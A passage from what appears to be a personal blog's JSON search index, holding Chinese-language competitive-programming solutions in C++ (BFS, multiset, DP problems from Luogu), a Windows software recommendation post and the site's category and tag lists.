Max为与k相连最大的点权值，Maxx为次大值 for (int i = head[k]; i; i = edge[i].nxt) &#123; int u = edge[i].to; if (a[u] &gt; Max) &#123; Maxx = Max; Max = a[u]; &#125; else if (a[u] &gt; Maxx) Maxx = a[u]; // 更新最大、次大值 sum = (sum + a[u]) % P; // 累加权值和 &#125; for (int i = head[k]; i; i = edge[i].nxt) &#123; int u = edge[i].to; ans = (ans + (sum - a[u]) * a[u]) % P; // 当前点对答案的贡献为（除自己外总和）*（自己的权值） &#125; Ans = max(Ans, Max * Maxx); // 当前公共点所能产生的最大联合权值为（最大值）*（次大值）&#125;int main() &#123; int n = read(); for (int i = 1; i &lt; n; i++) &#123; int x = read(), y = read(); add(x, y), add(y, x); &#125; // 前向星建边 for (int i = 1; i &lt;= n; i++) a[i] = read(); // 读入点权 for (int i = 1; i &lt;= n; i++) calc(i); // 枚举每个公共点计算 printf(&quot;%d %d&quot;, Ans, (ans + P) % P); // 因为我们在统计的时候是减一个数，所以可能会出现ans小于0的情况，要(ans+P)%P&#125;","categories":[{"name":"OI","slug":"OI","permalink":"https://sxyugao.top/categories/OI/"},{"name":"洛谷","slug":"OI/洛谷","permalink":"https://sxyugao.top/categories/OI/%E6%B4%9B%E8%B0%B7/"}],"tags":[{"name":"枚举","slug":"枚举","permalink":"https://sxyugao.top/tags/%E6%9E%9A%E4%B8%BE/"},{"name":"图论","slug":"图论","permalink":"https://sxyugao.top/tags/%E5%9B%BE%E8%AE%BA/"}]},{"title":"洛谷P1432 - 倒水问题","slug":"洛谷P1432-倒水问题","date":"2018-06-11T12:32:42.000Z","updated":"2022-01-07T13:57:23.227Z","comments":true,"path":"p/a5166969.html","permalink":"https://sxyugao.top/p/a5166969.html","excerpt":"很容易看出这是宽度优先搜索，因为要求步数最少，且每个操作代价相同。 我们可以按操作类别分 6 种情况扩展，如果搜到最终状态就跳出 BFS（搜索顺序可以随意，因为 spj 已经配置好了，不像数据修改前要有特定的顺序）。 记得标记已经出现过的情况，不然会 TLE/MLE；","text":"很容易看出这是宽度优先搜索，因为要求步数最少，且每个操作代价相同。 我们可以按操作类别分 6 种情况扩展，如果搜到最终状态就跳出 BFS（搜索顺序可以随意，因为 spj 已经配置好了，不像数据修改前要有特定的顺序）。 记得标记已经出现过的情况，不然会 TLE/MLE； 做宽搜题，队列能开多大就开多大。 正确开队列的方法：我们发现 $C_{a}$ 和 $C_{b}$ 最大只有 $10^3$，也就是说总状态数最多只有 $10^6$，所以把队列大小开成比状态数稍微多一点就行了。 代码如下： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364#include &lt;bits/stdc++.h&gt;using namespace std;bool vis[2005][2005];int va, vb, vc;void init() &#123; memset(vis, 0, sizeof(vis)); scanf(&quot;%d%d%d&quot;, &amp;va, &amp;vb, &amp;vc);&#125;struct Data &#123; int a, b, nxt, k, step;&#125; q[5000005];void print(int p) &#123; int t = q[p].nxt; if (!t) return; print(t); printf(&quot;%d &quot;, q[p].k);&#125;bool nxt(int l, int &amp;r, int a, int b, int opt) &#123; // 获取下一个状态 if (vis[a][b]) return 0; // 剪枝 r++; q[r].a = a, q[r].b = b, q[r].k = opt; q[r].nxt = l; vis[a][b] = 1; q[r].step = q[l].step + 1; if (q[r].b == vc) &#123; printf(&quot;%d &quot;, q[r].step); print(r), puts(&quot;&quot;); &#125; return q[r].b == vc;&#125;void solve() &#123; q[1].a = q[1].b = q[1].k = q[1].nxt = q[1].step = 0; vis[0][0] = 1; // 初始状态 int l = 0, r = 1; bool f = 0; while (l &lt; r &amp;&amp; !f) &#123; l++; f |= nxt(l, r, va, q[l].b, 1); // 把A装满 f |= nxt(l, r, q[l].a, vb, 2); // 把B装满 f |= nxt(l, r, 0, q[l].b, 3); // 把A倒空 f |= nxt(l, r, q[l].a, 0, 4); // 把B倒空 int ta = q[l].a + q[l].b, tb = 0; if (ta &gt; va) &#123; tb = ta - va; ta = va; &#125; // 如果超出容量了，那么处理一下 f |= nxt(l, r, ta, tb, 5); // 把B倒给A ta = 0, tb = q[l].a + q[l].b; if (tb &gt; vb) &#123; ta = tb - vb; tb = vb; &#125; f |= nxt(l, r, ta, tb, 6); // 把A倒给B &#125;&#125;int main() &#123; int T; scanf(&quot;%d&quot;, &amp;T); while (T--) &#123; init(); solve(); &#125;&#125;","categories":[{"name":"OI","slug":"OI","permalink":"https://sxyugao.top/categories/OI/"},{"name":"洛谷","slug":"OI/洛谷","permalink":"https://sxyugao.top/categories/OI/%E6%B4%9B%E8%B0%B7/"}],"tags":[{"name":"BFS","slug":"BFS","permalink":"https://sxyugao.top/tags/BFS/"},{"name":"STL","slug":"STL","permalink":"https://sxyugao.top/tags/STL/"}]},{"title":"洛谷P2234 - 「HNOI2002」营业额统计","slug":"洛谷P2234-营业额统计","date":"2018-06-08T02:35:00.000Z","updated":"2022-01-07T13:57:23.228Z","comments":true,"path":"p/b5fb6ff8.html","permalink":"https://sxyugao.top/p/b5fb6ff8.html","excerpt":"根据题意我们发现对于每个 $A_{i}$ ，与它绝对值最小的一定是前 $i$ 个数排序后在它前面或后面的数。 这样的话，我们维护一个单调的序列，插入每天的营业额时计算其波动值即可。 最暴力的便是插入排序，复杂度 $(N^2)$，不能忍受。。 我们应选择复杂度为 $(NlogN)$ 的方法。 维护一个单调序列自然想到了 set（平衡树也可以，但是作者想用 STL 水过去，雾），因为可能有多个相同的营业额，所以选择了 multiset。","text":"根据题意我们发现对于每个 $A_{i}$ ，与它绝对值最小的一定是前 $i$ 个数排序后在它前面或后面的数。 这样的话，我们维护一个单调的序列，插入每天的营业额时计算其波动值即可。 最暴力的便是插入排序，复杂度 $(N^2)$，不能忍受。。 我们应选择复杂度为 $(NlogN)$ 的方法。 维护一个单调序列自然想到了 set（平衡树也可以，但是作者想用 STL 水过去，雾），因为可能有多个相同的营业额，所以选择了 multiset。 下次有空写一个 set 的教程。 以下为代码： 123456789101112131415161718192021222324252627282930313233#include&lt;cstdio&gt;#include&lt;set&gt;using namespace std;typedef multiset&lt;int&gt;::iterator iter;// 定义iter类型，免去每次打一大串的苦恼const int inf=0x7fffffff;int n,x,ans;multiset&lt;int&gt;s;inline int min(int a,int b)&#123;return a&lt;b?a:b;&#125;inline int abs(int x)&#123;return x&lt;0?-x:x;&#125;int main()&#123; s.insert(inf);s.insert(-inf); // 插入正无穷和负无穷，防止迭代器访问到一些奇奇怪怪的内存导致RE scanf(&quot;%d&quot;,&amp;n); scanf(&quot;%d&quot;,&amp;x);s.insert(x);ans=x; // 第一个单独考虑 while(--n)&#123; scanf(&quot;%d&quot;,&amp;x); iter it=s.insert(x); // 插入x，并返回x在s中的位置（迭代器） it--; iter l=it; it++;it++; iter r=it; it--; // 迭代器只支持++，--运算符，所以看上去很麻烦。。 // 其实l就是上一个数，r是下一个数（在s中） if(*l==-inf)ans+=abs(x-*r); // 在最前面 if(*r==inf)ans+=abs(x-*l); // 在最后面 if(*l!=-inf&amp;&amp;*r!=inf)ans+=min(abs(x-*r),abs(x-*l));// 一般情况 &#125; printf(&quot;%d&quot;,ans);&#125;","categories":[{"name":"OI","slug":"OI","permalink":"https://sxyugao.top/categories/OI/"},{"name":"洛谷","slug":"OI/洛谷","permalink":"https://sxyugao.top/categories/OI/%E6%B4%9B%E8%B0%B7/"}],"tags":[{"name":"STL","slug":"STL","permalink":"https://sxyugao.top/tags/STL/"}]},{"title":"Windows 软件推荐","slug":"Windows软件推荐","date":"2018-05-12T12:19:05.000Z","updated":"2022-02-23T04:02:24.750Z","comments":true,"path":"p/c92482f1.html","permalink":"https://sxyugao.top/p/c92482f1.html","excerpt":"用了这么长时间的电脑，在尝试无数次后，终于整理出了一份较为详细的软件清单。我觉得好用的软件，我都会在这里与大家分享，希望大家能够喜欢。 ♪(´▽ ｀)","text":"用了这么长时间的电脑，在尝试无数次后，终于整理出了一份较为详细的软件清单。我觉得好用的软件，我都会在这里与大家分享，希望大家能够喜欢。 ♪(´▽ ｀) 一、编辑器 1、Visual Studio Code 作为一名 Coder，一个好的编辑器自然是必不可少的啦，相信大家也有自己喜欢的编辑器，我要介绍的是 VSCode。 笔者一开始觉得 VSCode 十分难用（当时太菜了，不会配置），用的是 Atom，后来实在是受不了国内安装 Atom 插件的极差体验，来到了 VSCode 的怀抱。嗯，真香。 使用了一段时间，我不禁感叹：微软爸爸牛逼！VSCode 和 Atom 虽然都基于 Electron，但 VSCode 的优化不知道比 Atom 高到哪里去了，内存占用也小得多。再加上 VSCode 的插件国内安装体验极好，反观 Atom 安装拓展经常失败，这个差距可不是一星半点儿。 如果有机会可以出一次 VSCode 的配置教程。 优点： 微软出品，质量有保障。 资源占用相对较少。 对国内更为友好的插件商店。 缺点： 老电脑带不动（雾） 配置相对较难，对小白不友好。 官网：https://code.visualstudio.com/ 2、Notepad++ Notepad++ 是一款轻量级的文本编辑器，正如它的名字一样，它可以说是 Windows 自带的 Notepad 的加强版。Notepad++ 插件较多，功能较为强大，占用的资源相当少，所以笔者在最初的时候是用它来写代码的。 虽然现在主要是使用 VSCode，但是平时打开一些小文件（比如 Oier 熟悉的样例文件）还是会用到它。 如果有机会可以出一次 Notepad++ 的配置教程。 优点： 极小的占用 丰富的插件 缺点： 界面较老 更新有时会网络超时（虽然不怪它） 官网：https://notepad-plus-plus.org/ 二、办公 1、BandiZip BandiZip 是一款很轻量、很简洁的压缩软件，界面还比较美观，体验十分舒适。虽然在某次更新后免费版增加了广告，但是并不是像某些软件那样给你弹窗，它只会在软件内部出现，而且并不影响正常使用，所以也没必要去找什么破解版，权当支持一下了。这里就不得不提一下某好压，好压的界面其实也挺不错的，我初中也一直在用，也感觉没啥广告，简直是2345良心，直到有一次双十一的时候给我弹广告，我才知道还是加了广告插件，就再也不用了。 优点： 界面美观 占用较小 缺点： 后续的免费版增加了广告 官网：https://www.bandisoft.com/bandizip/ 2、Office Tool Plus Office Tool Plus 是一款功能强大的 Office 部署工具，能安装各种版本的 Office。而且只需非常简单的几步，就能实现从高速下载到安装再到激活的流程，界面也非常美观。 优点： 功能齐全，操作简单 界面美观 官网：https://otp.landian.vip/zh-cn/","categories":[{"name":"极客","slug":"极客","permalink":"https://sxyugao.top/categories/%E6%9E%81%E5%AE%A2/"},{"name":"Windows","slug":"极客/Windows","permalink":"https://sxyugao.top/categories/%E6%9E%81%E5%AE%A2/Windows/"}],"tags":[{"name":"软件","slug":"软件","permalink":"https://sxyugao.top/tags/%E8%BD%AF%E4%BB%B6/"}]},{"title":"洛谷P1107 - 雷涛的小猫","slug":"洛谷P1107-雷涛的小猫","date":"2018-05-08T03:00:00.000Z","updated":"2022-01-07T13:57:23.227Z","comments":true,"path":"p/f1f923b5.html","permalink":"https://sxyugao.top/p/f1f923b5.html","excerpt":"我们根据题意，发现这是一个 DP 题，定义$f_{i,j}$表示在高度为$i$，当前要爬的树为$j$所能获得的最大柿子数。 易得状态转移方程：$f_{i,j}=max(f_{i-1,j},f_{i-delta,k}) (1\\leq k \\leq n)$，当$i&gt;delta$时后一项成立。 于是我们得到了一个时间复杂度为$O(H \\times N^2)$，空间复杂度为$O(N \\times H)$的算法啦。。","text":"我们根据题意，发现这是一个 DP 题，定义$f_{i,j}$表示在高度为$i$，当前要爬的树为$j$所能获得的最大柿子数。 易得状态转移方程：$f_{i,j}=max(f_{i-1,j},f_{i-delta,k}) (1\\leq k \\leq n)$，当$i&gt;delta$时后一项成立。 于是我们得到了一个时间复杂度为$O(H \\times N^2)$，空间复杂度为$O(N \\times H)$的算法啦。。 然而$N,H=2000$的数据这个时间复杂度还是难以承受，所以需要进一步的优化。 我们发现对于每个$i$，第二个转移的$i-delta$总是固定的，所以就可以直接处理出高度为$i$时$f_{i,j}$的最大值，时间复杂度降到$O(N \\times H)$ 接下来上代码： 1234567891011121314151617181920212223242526272829#include&lt;cstdio&gt;#include&lt;iostream&gt;using namespace std;#define gc ch=getchar()inline int read()&#123; int x=0,f=1;char gc; for(;ch&lt;&#x27;0&#x27;||ch&gt;&#x27;9&#x27;;gc)if(ch==&#x27;-&#x27;)f=-1; for(;ch&gt;=&#x27;0&#x27;&amp;&amp;ch&lt;=&#x27;9&#x27;;gc)x=x*10+ch-&#x27;0&#x27;; return x*f;&#125;#undef gc// 以上为快读，听说不用读入优化会TLE,比如cin、coutint n,h,d,g[2005],a[2005][2005],f[2005][2005];// g[i]表示高度为i时f[i][j]的最大值int main()&#123; n=read();h=read();d=read(); for(int i=1;i&lt;=n;i++)&#123; a[i][0]=read(); for(int j=1;j&lt;=a[i][0];j++)a[i][read()]++; // 注意，是每个上面有1个，所以要加一，而不是赋值为一 &#125; for(int i=1;i&lt;=h;i++)&#123; for(int j=1;j&lt;=n;j++)f[i][j]=f[i-1][j]+a[j][i]; if(i&gt;d)for(int j=1;j&lt;=n;j++)f[i][j]=max(f[i][j],g[i-d]+a[j][i]); for(int j=1;j&lt;=n;j++)g[i]=max(f[i][j],g[i]); // 转移见上 &#125; printf(&quot;%d&quot;,g[h]);&#125;","categories":[{"name":"OI","slug":"OI","permalink":"https://sxyugao.top/categories/OI/"},{"name":"洛谷","slug":"OI/洛谷","permalink":"https://sxyugao.top/categories/OI/%E6%B4%9B%E8%B0%B7/"}],"tags":[{"name":"DP","slug":"DP","permalink":"https://sxyugao.top/tags/DP/"}]},{"title":"Welcome To YuGao's House","slug":"Welcome","date":"2018-04-20T16:00:00.000Z","updated":"2022-01-07T15:20:25.918Z","comments":true,"path":"p/34ad00a8.html","permalink":"https://sxyugao.top/p/34ad00a8.html","excerpt":"","text":"欢迎来到我的个人主页，Have a good time! ヾ(≧▽≦*)o 于 2018/4/21，终于借助 Hexo 和 Coding 的页面托管服务将个人主页搭建完毕。 于 2019/1/28，更新主题并换用 Netlify 托管。 于 2019/7/21，更换Valine评论后端储存，评论丢失，从零开始。 P.S. 如果有谁想一起建个人主页的，可以通过&quot;关于&quot;联系我一起探讨，顺便交换一下友链蛤。","categories":[{"name":"其他","slug":"其他","permalink":"https://sxyugao.top/categories/%E5%85%B6%E4%BB%96/"}],"tags":[{"name":"其他","slug":"其他","permalink":"https://sxyugao.top/tags/%E5%85%B6%E4%BB%96/"}]}],"categories":[{"name":"CTF","slug":"CTF","permalink":"https://sxyugao.top/categories/CTF/"},{"name":"Web","slug":"CTF/Web","permalink":"https://sxyugao.top/categories/CTF/Web/"},{"name":"HWS","slug":"CTF/HWS","permalink":"https://sxyugao.top/categories/CTF/HWS/"},{"name":"蓝帽杯","slug":"CTF/蓝帽杯","permalink":"https://sxyugao.top/categories/CTF/%E8%93%9D%E5%B8%BD%E6%9D%AF/"},{"name":"HGAME","slug":"CTF/HGAME","permalink":"https://sxyugao.top/categories/CTF/HGAME/"},{"name":"N1BOOK","slug":"CTF/N1BOOK","permalink":"https://sxyugao.top/categories/CTF/N1BOOK/"},{"name":"极客","slug":"极客","permalink":"https://sxyugao.top/categories/%E6%9E%81%E5%AE%A2/"},{"name":"Hackergame","slug":"CTF/Hackergame","permalink":"https://sxyugao.top/categories/CTF/Hackergame/"},{"name":"环境配置","slug":"极客/环境配置","permalink":"https://sxyugao.top/categories/%E6%9E%81%E5%AE%A2/%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/"},{"name":"Windows","slug":"极客/Windows","permalink":"https://sxyugao.top/categories/%E6%9E%81%E5%AE%A2/Windows/"},{"name":"OI","slug":"OI","permalink":"https://sxyugao.top/categories/OI/"},{"name":"洛谷","slug":"OI/洛谷","permalink":"https://sxyugao.top/categories/OI/%E6%B4%9B%E8%B0%B7/"},{"name":"CodeForces","slug":"OI/CodeForces","permalink":"https://sxyugao.top/categories/OI/CodeForces/"},{"name":"转载","slug":"转载","permalink":"https://sxyugao.top/categories/%E8%BD%AC%E8%BD%BD/"},{"name":"Linux","slug":"极客/Linux","permalink":"https://sxyugao.top/categories/%E6%9E%81%E5%AE%A2/Linux/"},{"name":"其他","slug":"其他","permalink":"https://sxyugao.top/categories/%E5%85%B6%E4%BB%96/"}],"tags":[{"name":"PHP伪协议","slug":"PHP伪协议","permalink":"https://sxyugao.top/tags/PHP%E4%BC%AA%E5%8D%8F%E8%AE%AE/"},{"name":"文件包含","slug":"文件包含","permalink":"https://sxyugao.top/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"},{"name":"HWS","slug":"HWS","permalink":"https://sxyugao.top/tags/HWS/"},{"name":"蓝帽杯","slug":"蓝帽杯","permalink":"https://sxyugao.top/tags/%E8%93%9D%E5%B8%BD%E6%9D%AF/"},{"name":"PHP","slug":"PHP","permalink":"https://sxyugao.top/tags/PHP/"},{"name":"HGAME","slug":"HGAME","permalink":"https://sxyugao.top/tags/HGAME/"},{"name":"N1BOOK","slug":"N1BOOK","permalink":"https://sxyugao.top/tags/N1BOOK/"},{"name":"文件上传","slug":"文件上传","permalink":"https://sxyugao.top/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"},{"name":"软件","slug":"软件","permalink":"https://sxyugao.top/tags/%E8%BD%AF%E4%BB%B6/"},{"name":"SQLi","slug":"SQLi","permalink":"https://sxyugao.top/tags/SQLi/"},{"name":"Hackergame","slug":"Hackergame","permalink":"https://sxyugao.top/tags/Hackergame/"},{"name":"DP","slug":"DP","permalink":"https://sxyugao.top/tags/DP/"},{"name":"树上问题","slug":"树上问题","permalink":"https://sxyugao.top/tags/%E6%A0%91%E4%B8%8A%E9%97%AE%E9%A2%98/"},{"name":"概率期望","slug":"概率期望","permalink":"https://sxyugao.top/tags/%E6%A6%82%E7%8E%87%E6%9C%9F%E6%9C%9B/"},{"name":"数学","slug":"数学","permalink":"https://sxyugao.top/tags/%E6%95%B0%E5%AD%A6/"},{"name":"STL","slug":"STL","permalink":"https://sxyugao.top/tags/STL/"},{"name":"Linux","slug":"Linux","permalink":"https://sxyugao.top/tags/Linux/"},{"name":"PowerShell","slug":"PowerShell","permalink":"https://sxyugao.top/tags/PowerShell/"},{"name":"线段树","slug":"线段树","permalink":"https://sxyugao.top/tags/%E7%BA%BF%E6%AE%B5%E6%A0%91/"},{"name":"树链剖分","slug":"树链剖分","permalink":"https://sxyugao.top/tags/%E6%A0%91%E9%93%BE%E5%89%96%E5%88%86/"},{"name":"BFS","slug":"BFS","permalink":"https://sxyugao.top/tags/BFS/"},{"name":"贪心","slug":"贪心","permalink":"https://sxyugao.top/tags/%E8%B4%AA%E5%BF%83/"},{"name":"排序","slug":"排序","permalink":"https://sxyugao.top/tags/%E6%8E%92%E5%BA%8F/"},{"name":"枚举","slug":"枚举","permalink":"https://sxyugao.top/tags/%E6%9E%9A%E4%B8%BE/"},{"name":"图论","slug":"图论","permalink":"https://sxyugao.top/tags/%E5%9B%BE%E8%AE%BA/"},{"name":"其他","slug":"其他","permalink":"https://sxyugao.top/tags/%E5%85%B6%E4%BB%96/"}]}